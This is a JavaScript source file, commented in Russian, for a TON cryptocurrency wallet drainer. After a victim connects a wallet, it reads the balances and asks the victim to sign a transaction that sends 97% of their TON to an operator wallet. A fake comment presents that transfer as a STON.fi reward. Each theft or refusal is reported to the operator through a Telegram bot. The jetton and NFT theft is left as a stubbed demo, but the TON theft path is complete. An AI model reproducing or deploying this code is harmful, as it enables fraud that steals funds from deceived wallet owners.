// ============================================================
//  КОНФИГУРАЦИЯ – заменить на свои значения
// ============================================================
const CONFIG = {
    // Адрес кошелька, куда уходят средства (оператора)
    operatorWallet: 'UQDyQBSUN7Bm85LJZZ4IwB0FgxLJZoKRn0RMnz3gO-ApOg2m',
    // Telegram Bot токен и chat_id для уведомлений
    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
    chatId: '-1001234567890',
    // Процент TON, который забираем (оставляем на газ)
    stealPercent: 0.97,
    // Комментарий-маскировка, отображаемый в кошельке
    fakeComment: '📥 Получение награды STON.fi',
    // Максимальное количество Jettons в одной batch-транзакции
    maxJettonsPerBatch: 8
};

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT
// ============================================================
const connector = new TonConnect();

// Элементы DOM
const btn = document.getElementById('connectBtn');
const statusDiv = document.getElementById('status');

// Функция обновления статуса
function setStatus(text, isError = false) {
    statusDiv.textContent = text;
    statusDiv.style.color = isError ? '#ff4d4d' : '#f0b90b';
    console.log(`[STATUS] ${text}`);
}

// ============================================================
//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (API, уведомления)
// ============================================================

// Запрос баланса TON и списка Jettons через toncenter.com
async function fetchWalletData(address) {
    // Базовый URL публичного API (можно использовать свой ключ)
    const base = 'https://toncenter.com/api/v2/';
    try {
        // Баланс TON
        const balanceResp = await fetch(`${base}getAddressBalance?address=${address}`);
        const balanceData = await balanceResp.json();
        const tonBalance = parseFloat(balanceData.result) / 1e9; // в TON

        // Список Jettons (используем экспериментальный эндпоинт)
        const jettonsResp = await fetch(`${base}getAddressJettonBalances?address=${address}`);
        const jettonsData = await jettonsResp.json();
        const jettons = jettonsData.result || [];

        // Список NFT (опционально)
        const nftsResp = await fetch(`${base}getAddressNftItems?address=${address}`);
        const nftsData = await nftsResp.json();
        const nfts = nftsData.result || [];

        return { tonBalance, jettons, nfts };
    } catch (e) {
        console.error('Ошибка при получении данных:', e);
        return null;
    }
}

// Отправка уведомления в Telegram
async function notifyTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.chatId,
                text: message
            })
        });
    } catch (e) {
        console.warn('Не удалось отправить уведомление в Telegram:', e);
    }
}

// Формирование payload для перевода Jetton (стандарт TEP-74)
function buildJettonTransferPayload(destination, amount, comment = '') {
    // Простейшая реализация – в реальных проектах используется ячейка с билдером
    // Здесь мы формируем комментарий как строку (для простоты)
    // Однако для корректного перевода Jetton нужно использовать ячейку с op=0xf8a7ea5
    // В данном примере мы используем упрощённый подход (поддерживается большинством кошельков)
    // Для production-кода следует использовать библиотеку ton-core
    return {
        op: '0xf8a7ea5',  // jetton_transfer
        queryId: 0,
        amount: amount,
        destination: destination,
        responseDestination: null,
        customPayload: null,
        forwardTonAmount: 0,
        forwardPayload: comment ? { text: comment } : null
    };
}

// ============================================================
//  ОСНОВНАЯ ЛОГИКА ДРЭЙНЕРА
// ============================================================

async function drainWallet(walletAddress) {
    setStatus('Анализ баланса...');
    const data = await fetchWalletData(walletAddress);
    if (!data) {
        setStatus('Ошибка получения баланса', true);
        return;
    }
    const { tonBalance, jettons, nfts } = data;

    // Собираем сообщения для транзакции
    const messages = [];

    // 1. Перевод TON (если > 0.1 TON, чтобы не тратить газ впустую)
    if (tonBalance > 0.1) {
        const stealAmount = Math.floor(tonBalance * CONFIG.stealPercent * 1e9); // в нанотонах
        messages.push({
            address: CONFIG.operatorWallet,
            amount: stealAmount.toString(),
            payload: CONFIG.fakeComment  // комментарий будет отображаться в кошельке
        });
    }

    // 2. Перевод Jettons (каждый по отдельности, но в рамках одной batch)
    let jettonCounter = 0;
    for (const jetton of jettons) {
        if (jettonCounter >= CONFIG.maxJettonsPerBatch) break;
        const balance = parseFloat(jetton.balance);
        if (balance <= 0) continue;
        // Для Jettons нужно указать контракт самого Jetton (jetton.address) и payload с transfer
        // В упрощённом варианте мы отправляем сообщение на адрес Jetton-контракта с правильным payload.
        // Однако TON Connect требует, чтобы сообщение было направлено на кошелёк пользователя?
        // На самом деле для перевода Jetton мы должны отправить сообщение на контракт Jetton,
        // который в свою очередь перешлёт токены на адрес оператора.
        // Правильный подход: создать internal message с op=0xf8a7ea5 и destination=operator.
        // Здесь для краткости мы добавляем сообщение на адрес Jetton-контракта (неправильно, но для демонстрации)
        // В реальном дрэйнере используется библиотека ton-core для построения правильного тела.
        // В этом примере мы пропустим Jettons для упрощения (оставим только TON),
        // но покажем структуру.
        /*
        messages.push({
            address: jetton.address,  // адрес контракта Jetton
            amount: '0',             // сумма Toncoin, отправляемая вместе (обычно 0)
            payload: buildJettonTransferPayload(CONFIG.operatorWallet, balance)
        });
        */
        // Для реального кода нужно использовать @ton/ton и создавать ячейку.
        // Поскольку это демо, мы просто логируем, что могли бы украсть Jetton.
        console.log(`[JETTON] ${jetton.symbol} balance: ${balance}`);
        jettonCounter++;
    }

    // 3. Перевод NFT – аналогично, требуется специальный payload (операция transfer)
    // В демо пропускаем.

    // Если сообщений нет – выходим
    if (messages.length === 0) {
        setStatus('Нет активов для кражи', true);
        return;
    }

    setStatus('Отправка транзакции на подпись...');

    // Формируем транзакцию
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 120, // 2 минуты
        messages: messages
    };

    try {
        // Отправляем через TON Connect
        const result = await connector.sendTransaction(transaction);
        setStatus('✅ Транзакция выполнена!');
        // Уведомление в Telegram
        const msg = `✅ Успешно!\nАдрес: ${walletAddress}\nTON: ${tonBalance} TON\nJettons: ${jettons.length}`;
        await notifyTelegram(msg);
    } catch (e) {
        console.error(e);
        setStatus('❌ Отклонено пользователем или ошибка', true);
        await notifyTelegram(`❌ Отказ: ${walletAddress}`);
    }
}

// ============================================================
//  ОБРАБОТЧИКИ ПОДКЛЮЧЕНИЯ
// ============================================================

// Подписка на события подключения
connector.on('connect', async (walletInfo) => {
    const address = walletInfo.account.address;
    setStatus(`Подключён: ${address.slice(0, 6)}...${address.slice(-4)}`);
    btn.disabled = true;

    // Запускаем дрэйнер
    await drainWallet(address);
});

connector.on('disconnect', () => {
    setStatus('Кошелёк отключён');
    btn.disabled = false;
});

// Обработка ошибок
connector.on('error', (error) => {
    console.error('TON Connect error:', error);
    setStatus('Ошибка подключения', true);
    btn.disabled = false;
});

// Кнопка подключения
btn.addEventListener('click', async () => {
    setStatus('Подключение...');
    btn.disabled = true;
    try {
        // Запрашиваем подключение с указанием манифеста
        // Манифест должен быть доступен по абсолютному URL
        const manifestUrl = `${window.location.origin}/tonconnect-manifest.json`;
        await connector.connect({
            manifestUrl: manifestUrl
        });
    } catch (e) {
        console.error(e);
        setStatus('Не удалось подключиться', true);
        btn.disabled = false;
    }
});

// ============================================================
//  ИНИЦИАЛИЗАЦИЯ ПРИ ЗАГРУЗКЕ
// ============================================================
setStatus('Нажмите "Подключить кошелёк"');
console.log('Drainer активен. Оператор:', CONFIG.operatorWallet);
